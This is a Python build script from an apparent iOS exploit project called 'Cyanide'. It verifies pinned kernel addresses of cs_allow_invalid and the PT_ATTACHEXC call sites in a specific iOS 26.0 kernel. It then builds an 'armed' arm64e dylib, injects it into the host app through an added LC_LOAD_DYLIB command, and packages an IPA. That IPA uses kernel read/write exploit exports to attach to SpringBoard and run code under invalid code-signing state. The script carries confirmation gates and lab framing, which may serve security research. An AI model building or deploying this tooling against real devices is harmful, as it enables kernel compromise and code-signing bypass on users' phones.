#!/usr/bin/env python3
"""Audit, build, and package the fail-closed 23A341 physical RX probe.

This script never installs or launches the probe. The generated IPA preserves
Cyanide's bundle identifier so it installs over the existing app and reuses its
container/KRW recovery metadata. It must still be signed by the operator.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import plistlib
import shutil
import subprocess
import tempfile
import time
import zipfile
from pathlib import Path


REPO_ROOT = Path(__file__).resolve().parents[2]
SOURCE = REPO_ROOT / "scripts/lab/cnd_physical_cs_allow_invalid_probe.m"
BUILD_DIR = REPO_ROOT / "build/lab-cs-allow-invalid"
DEFAULT_APP = (
    REPO_ROOT
    / "build/DerivedData/Build/Products/Debug-iphoneos/Cyanide.app"
)
IPSW_URL = (
    "https://updates.cdn-apple.com/2025FallFCS/fullrestores/093-41023/"
    "5740BA6D-F4D8-4825-B5BE-CB70E3CF8B79/"
    "iPhone17,2_26.0_23A341_Restore.ipsw"
)
MANIFEST = (
    BUILD_DIR / "manifest-23A341-iphone17,2/23A341__iPhone17,2/"
    "BuildManifest.plist"
)
KERNEL = (
    BUILD_DIR
    / "kernel-23A341-iphone17,2/23A341__iPhone17,2/"
    "kernelcache.release.iPhone17,2"
)
MANIFEST_SHA256 = "3bd9185242c487ef4a970d56f332ae795ef9c5a23f7998646052635e6cff8f24"
KERNEL_SHA256 = "7e66ddbb70b626c4502c3036620b59829b744c54712a74ca50f4a0c004c89f8c"
UNSLID_BASE = 0xFFFFFFF007004000
CS_ALLOW_INVALID = 0xFFFFFFF0086E6B68
PTRACE_ATTACHEXC_CALLS = 0xFFFFFFF008761928
CONFIRMATION = "BUILD-SPRINGBOARD-RX-PROBE-23A341"
DYLIB_NAME = "CNDPhysicalCSAllowInvalidProbe.dylib"
DYLIB_LOAD_PATH = f"@executable_path/Frameworks/{DYLIB_NAME}"

REQUIRED_HOST_EXPORTS = (
    "_g_kernel_base",
    "_g_kernel_slide",
    "_off_proc_p_pid",
    "_kread32",
    "_kreadbuf",
    "_kexploit_krw_ready",
    "_kexploit_opa334",
    "_kexploit_terminal_cleanup",
    "_proc_find",
    "_proc_find_by_name",
    "_proc_get_p_name",
    "_proc_task",
    "_r_dlsym_call",
    "_remote_call_current_success",
    "_remote_call_with_session",
    "_OBJC_CLASS_$_RemoteCallSession",
)


class ProbeError(RuntimeError):
    pass


def run(command: list[str], *, input_text: str | None = None) -> str:
    result = subprocess.run(
        command,
        cwd=REPO_ROOT,
        input=input_text,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    )
    if result.returncode != 0:
        rendered = " ".join(command)
        raise ProbeError(f"command failed ({result.returncode}): {rendered}\n{result.stdout}")
    return result.stdout


def sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def audit_kernel(*, check_ipsw_hash: bool) -> dict[str, object]:
    expected_attach_offset = PTRACE_ATTACHEXC_CALLS - UNSLID_BASE
    expected_source_macro = (
        "#define CND_PTRACE_ATTACHEXC_CALLS_OFFSET "
        f"UINT64_C(0x{expected_attach_offset:08x})"
    )
    if expected_source_macro not in SOURCE.read_text(encoding="utf-8"):
        raise ProbeError(
            "runtime PT_ATTACHEXC offset does not match the pinned absolute address: "
            f"expected 0x{expected_attach_offset:x}"
        )
    if not MANIFEST.is_file():
        raise ProbeError(f"exact remote-extracted BuildManifest is missing: {MANIFEST}")
    manifest_hash = sha256(MANIFEST)
    if manifest_hash != MANIFEST_SHA256:
        raise ProbeError(
            f"BuildManifest SHA-256 mismatch: {manifest_hash} != {MANIFEST_SHA256}"
        )
    manifest = plistlib.loads(MANIFEST.read_bytes())
    product_build = manifest.get("ProductBuildVersion")
    supported = manifest.get("SupportedProductTypes", [])
    if product_build != "23A341" or "iPhone17,2" not in supported:
        raise ProbeError(
            f"IPSW identity mismatch: build={product_build!r} products={supported!r}"
        )
    if not KERNEL.is_file():
        raise ProbeError(
            "decompressed exact kernel is missing; extract/decompress the "
            f"23A341 release kernel at {KERNEL}"
        )
    kernel_hash = sha256(KERNEL)
    if kernel_hash != KERNEL_SHA256:
        raise ProbeError(
            f"kernel SHA-256 mismatch: {kernel_hash} != {KERNEL_SHA256}"
        )
    if check_ipsw_hash:
        raise ProbeError(
            "the full iPhone17,2 IPSW is intentionally not cached; the exact "
            "Apple URL, BuildManifest hash, and extracted kernel hash are pinned"
        )

    function_disassembly = run([
        "/opt/homebrew/bin/ipsw", "macho", "disass",
        "--fileset-entry", "com.apple.kernel",
        "--vaddr", str(CS_ALLOW_INVALID), "--count", "10", "--quiet",
        str(KERNEL),
    ])
    required_function_lines = (
        "0xfffffff0086e6b68:  7f 23 03 d5   pacibsp",
        "0xfffffff0086e6b84:  f3 03 00 aa   mov\tx19, x0",
        "0xfffffff0086e6b88:  fa 08 0d 94   bl\t0xfffffff008a28f70",
    )
    if not all(line in function_disassembly for line in required_function_lines):
        raise ProbeError("cs_allow_invalid disassembly does not match the pinned kernel")

    call_disassembly = run([
        "/opt/homebrew/bin/ipsw", "macho", "disass",
        "--fileset-entry", "com.apple.kernel",
        "--vaddr", str(PTRACE_ATTACHEXC_CALLS), "--count", "6", "--quiet",
        str(KERNEL),
    ])
    required_attach_lines = (
        "0xfffffff008761928:  e0 03 13 aa   mov\tx0, x19",
        "0xfffffff00876192c:  8f 14 fe 97   bl\t0xfffffff0086e6b68",
        "0xfffffff008761930:  e0 03 15 aa   mov\tx0, x21",
        "0xfffffff008761934:  8d 14 fe 97   bl\t0xfffffff0086e6b68",
    )
    if not all(line in call_disassembly for line in required_attach_lines):
        raise ProbeError(
            "the exact PT_ATTACHEXC target/tracer calls do not match the pinned kernel"
        )

    evidence: dict[str, object] = {
        "product": "iPhone17,2",
        "build": product_build,
        "kernelVersion": "xnu-12377.2.8~1/RELEASE_ARM64_T8140",
        "ipswURL": IPSW_URL,
        "buildManifest": str(MANIFEST),
        "buildManifestSHA256": manifest_hash,
        "decompressedKernel": str(KERNEL),
        "decompressedKernelSHA256": kernel_hash,
        "unslidKernelBase": f"0x{UNSLID_BASE:016x}",
        "csAllowInvalid": f"0x{CS_ALLOW_INVALID:016x}",
        "csAllowInvalidOffset": f"0x{CS_ALLOW_INVALID - UNSLID_BASE:x}",
        "ptraceAttachExcCallsite": f"0x{PTRACE_ATTACHEXC_CALLS:016x}",
        "ptraceAttachExcOffset": f"0x{expected_attach_offset:x}",
        "derivation": (
            "both exact PT_ATTACHEXC calls (target and tracer) resolve to the "
            "same function; its body "
            "matches XNU cs_allow_invalid including MAC rejection, csflag "
            "update, and pmap/debug-map transitions"
        ),
    }
    BUILD_DIR.mkdir(parents=True, exist_ok=True)
    evidence_path = BUILD_DIR / "kernel-evidence-23A341.json"
    evidence_path.write_text(json.dumps(evidence, indent=2, sort_keys=True) + "\n")
    return evidence


def require_confirmation(value: str | None) -> None:
    if value != CONFIRMATION:
        raise ProbeError(
            "refusing to create an armed physical payload; pass "
            f"--confirm {CONFIRMATION}"
        )


def build_payload(*, nonce: str) -> Path:
    BUILD_DIR.mkdir(parents=True, exist_ok=True)
    output = BUILD_DIR / DYLIB_NAME
    run([
        "xcrun", "--sdk", "iphoneos", "clang",
        "-arch", "arm64e", "-miphoneos-version-min=16.0",
        "-dynamiclib", "-fobjc-arc", "-fblocks",
        "-Wall", "-Wextra", "-Werror",
        "-DCND_PHYSICAL_PROBE_ARMED=1",
        f'-DCND_PHYSICAL_PROBE_NONCE="{nonce}"',
        "-Wl,-undefined,dynamic_lookup",
        "-Wl,-install_name," + DYLIB_LOAD_PATH,
        str(SOURCE), "-framework", "Foundation", "-framework", "UIKit",
        "-o", str(output),
    ])
    run(["codesign", "-s", "-", "--force", str(output)])
    info = run(["file", str(output)])
    if "arm64e" not in info:
        raise ProbeError(f"payload is not arm64e: {info.strip()}")
    return output


def validate_host_app(app: Path) -> tuple[Path, dict[str, object]]:
    if not app.is_dir():
        raise ProbeError(f"host app is missing: {app}")
    info_path = app / "Info.plist"
    if not info_path.is_file():
        raise ProbeError(f"host Info.plist is missing: {info_path}")
    info = plistlib.loads(info_path.read_bytes())
    executable_name = info.get("CFBundleExecutable")
    executable = app / str(executable_name)
    if not executable.is_file():
        raise ProbeError(f"host executable is missing: {executable}")
    file_info = run(["file", str(executable)])
    if "arm64e" not in file_info:
        raise ProbeError("host executable has no arm64e slice")
    exports = run(["xcrun", "nm", "-gU", str(executable)])
    missing = [symbol for symbol in REQUIRED_HOST_EXPORTS if symbol not in exports]
    if missing:
        raise ProbeError(f"host executable is missing required exports: {missing}")
    return executable, info


def package(app: Path, payload: Path, *, nonce: str) -> Path:
    executable, original_info = validate_host_app(app)
    del executable
    with tempfile.TemporaryDirectory(
        prefix="cnd-cs-invalid-package-", dir=BUILD_DIR
    ) as temporary:
        root = Path(temporary)
        payload_root = root / "Payload"
        packaged_app = payload_root / "Cyanide.app"
        payload_root.mkdir()
        shutil.copytree(app, packaged_app, symlinks=True)

        info_path = packaged_app / "Info.plist"
        info = plistlib.loads(info_path.read_bytes())
        original_identifier = str(info.get("CFBundleIdentifier", "com.cyanide"))
        info["UIFileSharingEnabled"] = True
        info["LSSupportsOpeningDocumentsInPlace"] = True
        info_path.write_bytes(plistlib.dumps(info, fmt=plistlib.FMT_BINARY))

        frameworks = packaged_app / "Frameworks"
        frameworks.mkdir(exist_ok=True)
        packaged_dylib = frameworks / DYLIB_NAME
        shutil.copy2(payload, packaged_dylib)

        executable_name = str(info["CFBundleExecutable"])
        packaged_executable = packaged_app / executable_name
        run([
            "/opt/homebrew/bin/ipsw", "macho", "patch", "add",
            str(packaged_executable), "LC_LOAD_DYLIB", DYLIB_LOAD_PATH,
            "1.0.0", "1.0.0", "--overwrite",
        ], input_text="n\n")
        for architecture in ("arm64", "arm64e"):
            loads = run([
                "xcrun", "otool", "-arch", architecture, "-L",
                str(packaged_executable),
            ])
            if DYLIB_LOAD_PATH not in loads:
                raise ProbeError(
                    f"probe load command is missing from {architecture} host slice"
                )

        readme = packaged_app / "PHYSICAL-PROBE-README.txt"
        readme.write_text(
            "Cyanide physical cs_allow_invalid / private-RX probe\n"
            "Exact target: iPhone17,2 (iPhone 16 Pro Max), iOS 26.0 build 23A341.\n"
            "This IPA is unsigned. Sign it with the normal sideload tool.\n"
            "It preserves Cyanide's bundle identifier and installs over Cyanide.\n"
            "Launch Cyanide and tap Run SpringBoard RX Probe. The base-app button\n"
            "reuses or acquires KRW and tries PT_ATTACHEXC on SpringBoard only,\n"
            "detaches, maps one private anonymous page, executes a nonce, then\n"
            "forces one respring after saving the result, parks KRW, and closes\n"
            "Cyanide so both temporary debug allowances are cleared.\n"
            "It does not open or inject Spotlight and never falls back\n"
            "to PT_TRACE_ME, so it does not grant invalid-code state to launchd.\n"
            "The JSON result is exposed through Files under Cyanide RX Probe.\n"
            f"Nonce: {nonce}\n"
        )

        output = REPO_ROOT / "build/Cyanide-Physical-RX-Probe-23A341.ipa"
        if output.exists():
            output.unlink()
        with zipfile.ZipFile(output, "w", compression=zipfile.ZIP_DEFLATED) as archive:
            for path in sorted(root.rglob("*")):
                if path.is_file():
                    archive.write(path, path.relative_to(root))

    manifest = {
        "artifact": str(output),
        "artifactSHA256": sha256(output),
        "sourceApp": str(app),
        "sourceBundleIdentifier": original_info.get("CFBundleIdentifier"),
        "probeBundleIdentifier": original_info.get("CFBundleIdentifier"),
        "nonce": nonce,
        "signed": False,
        "installed": False,
        "target": "SpringBoard",
        "fallbackToTraceMe": False,
        "userTriggered": True,
        "acquiresAndCleansKRW": True,
        "opensSpotlight": False,
        "forcesRespringAfterAcceptedAttach": True,
        "terminatesCyanideAfterAcceptedAttach": True,
        "preservesExistingContainer": True,
    }
    (BUILD_DIR / "physical-probe-artifact.json").write_text(
        json.dumps(manifest, indent=2, sort_keys=True) + "\n"
    )
    return output


def parser() -> argparse.ArgumentParser:
    result = argparse.ArgumentParser(description=__doc__)
    subparsers = result.add_subparsers(dest="command", required=True)

    audit = subparsers.add_parser("audit", help="verify exact local kernel evidence")
    audit.add_argument("--full-ipsw-hash", action="store_true")

    build = subparsers.add_parser("build", help="build the armed arm64e dylib")
    build.add_argument("--confirm")
    build.add_argument("--full-ipsw-hash", action="store_true")
    build.add_argument("--nonce")

    package_parser = subparsers.add_parser(
        "package", help="build an unsigned, separate-bundle lab IPA"
    )
    package_parser.add_argument("--confirm")
    package_parser.add_argument("--full-ipsw-hash", action="store_true")
    package_parser.add_argument("--nonce")
    package_parser.add_argument("--app", type=Path, default=DEFAULT_APP)
    return result


def main() -> int:
    args = parser().parse_args()
    evidence = audit_kernel(check_ipsw_hash=args.full_ipsw_hash)
    if args.command == "audit":
        print(json.dumps(evidence, indent=2, sort_keys=True))
        return 0

    require_confirmation(args.confirm)
    nonce = args.nonce or str(time.time_ns())
    if not nonce.isascii() or not nonce.isdigit() or len(nonce) > 32:
        raise ProbeError("nonce must contain 1-32 ASCII digits")
    payload = build_payload(nonce=nonce)
    print(f"built {payload}")
    if args.command == "package":
        output = package(args.app.resolve(), payload, nonce=nonce)
        print(f"packaged {output}")
        print("not installed; the IPA is unsigned and remains lab-only")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except ProbeError as error:
        print(f"error: {error}", file=os.sys.stderr)
        raise SystemExit(1)
